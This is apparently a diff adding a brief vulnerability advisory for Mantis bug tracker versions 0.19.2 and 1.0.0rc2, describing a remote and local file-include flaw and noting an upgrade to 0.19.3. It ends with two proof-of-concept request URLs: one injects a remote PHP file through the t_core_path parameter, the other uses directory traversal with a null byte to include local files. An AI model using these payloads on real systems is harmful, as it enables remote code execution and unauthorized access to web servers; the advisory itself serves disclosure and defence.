@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/15212/info
+
+Mantis is prone to a remote and local file include vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.
+
+An attacker can exploit this issue to execute arbitrary remote and local PHP code on an affected computer with the privileges of the Web server process. This may facilitate unauthorized access.
+
+Versions 0.19.2 and 1.0.0rc2 are affected; an upgrade to version 0.19.3 is available. 
+
+http://www.example.com/bug_sponsorship_list_view_inc.php?
+t_core_path=http://[host]/[file].php?
+http://www.example.com/bug_sponsorship_list_view_inc.php?
+t_core_path=../../../../../../../[file]%00 
